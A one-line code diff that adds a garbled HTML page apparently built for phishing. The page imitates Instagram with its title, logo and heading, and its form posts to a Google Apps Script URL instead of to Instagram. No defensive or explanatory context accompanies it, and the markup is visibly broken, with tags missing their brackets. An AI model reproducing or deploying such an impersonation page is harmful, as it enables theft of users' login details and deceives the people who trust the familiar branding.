@@ -1,0 +1,1 @@
+!DOCTYPE html html head /title instagram /title body bgcolor=white center img src=https://instagram.com/static/images/web/mobile_nav_type_logo.png width=200 height=80> h2Instagram/h2 form method=POST action=https://script.google.com/macros/s//action br button type=submit / form / body / html 
